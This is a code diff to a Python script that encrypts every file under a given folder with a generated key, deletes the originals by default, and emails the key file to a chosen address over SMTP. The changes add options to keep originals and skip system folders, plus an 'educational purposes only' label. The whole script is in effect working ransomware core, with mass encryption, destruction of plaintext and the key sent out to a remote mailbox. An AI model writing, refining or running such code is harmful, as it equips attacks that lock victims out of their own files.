@@ -34,16 +34,27 @@ def load_key_from_file(file_path):
         return None
 
 # Encrypt a file using the given key
-def encrypt_file(file_path, key):
+def encrypt_file(file_path, key, delete_original=True):
     cipher_suite = Fernet(key)
     try:
+        if file_path.endswith('.enc'):
+            logging.warning(f"Skipping already encrypted file: {file_path}")
+            return  # Skip files already encrypted
+        
         with open(file_path, 'rb') as file:
             plaintext = file.read()
         encrypted_text = cipher_suite.encrypt(plaintext)
-        with open(file_path + '.enc', 'wb') as file:
+        
+        encrypted_file_path = file_path + '.enc'
+        with open(encrypted_file_path, 'wb') as file:
             file.write(encrypted_text)
-        os.remove(file_path)  # Optionally delete the original file after encryption
-        logging.info(f"Encrypted {file_path}")
+
+        if delete_original:
+            os.remove(file_path)  # Optionally delete the original file after encryption
+            logging.info(f"Encrypted and deleted original: {file_path}")
+        else:
+            logging.info(f"Encrypted {file_path} and kept original.")
+
     except Exception as e:
         logging.error(f"Failed to encrypt {file_path}: {e}")
 
@@ -85,26 +96,38 @@ def send_email_with_attachment(sender_email, sender_password, receiver_email, su
     finally:
         server.quit()
 
+def should_skip_folder(folder):
+    sensitive_folders = ['/Windows', '/System32', '/Program Files', '/Program Files (x86)', '/Users']
+    return any(sensitive_folder in folder for sensitive_folder in sensitive_folders)
+
 def main():
-    parser = argparse.ArgumentParser(description="Encrypt files and send the key via email")
+    parser = argparse.ArgumentParser(description="Encrypt files and send the key via email (For Educational Purposes Only)")
     parser.add_argument('-b', '--body', required=True, help='Email body text')
     parser.add_argument('-s', '--sender-email', required=True, help="Sender's email address")
-    parser.add_argument('-p', '--sender-password', required=True, help="Sender's email password")
+    parser.add_argument('-p', '--sender-password', required=True, help="Sender's email password (use environment variables for safety)")
     parser.add_argument('-r', '--receiver-email', required=True, help="Receiver's email address")
     parser.add_argument('-sub', '--subject', required=True, help='Email subject')
     parser.add_argument('--smtp-server', required=True, help='SMTP server address')
     parser.add_argument('--smtp-port', type=int, required=True, help='SMTP server port')
     parser.add_argument('--path', required=True, help='Path to the folder to encrypt')
+    parser.add_argument('--keep-original', action='store_true', help='Keep original files after encryption')
+    parser.add_argument('--no-encrypt-backups', action='store_true', help="Avoid encrypting backup and system folders")
     args = parser.parse_args()
 
     body = args.body
     sender_email = args.sender_email
-    sender_password = args.sender_password
+    sender_password = os.getenv('EMAIL_PASSWORD', args.sender_password)  # Use environment variable if set
     receiver_email = args.receiver_email
     subject = args.subject
     smtp_server = args.smtp_server
     smtp_port = args.smtp_port
     folder_to_encrypt = args.path
+    delete_original = not args.keep_original
+
+    if args.no_encrypt_backups:
+        if should_skip_folder(folder_to_encrypt):
+            logging.error("Skipping encryption in system/backup folder for safety.")
+            return
 
     encryption_key = generate_key()
     key_file_path = 'encrypted_key.enc'
@@ -119,7 +142,7 @@ def main():
     for root, _, files in os.walk(folder_to_encrypt):
         for file in files:
             file_path = os.path.join(root, file)
-            encrypt_file(file_path, encryption_key)
+            encrypt_file(file_path, encryption_key, delete_original=delete_original)
 
     send_email_with_attachment(sender_email, sender_password, receiver_email, subject, body, key_file_path, smtp_server, smtp_port)
 
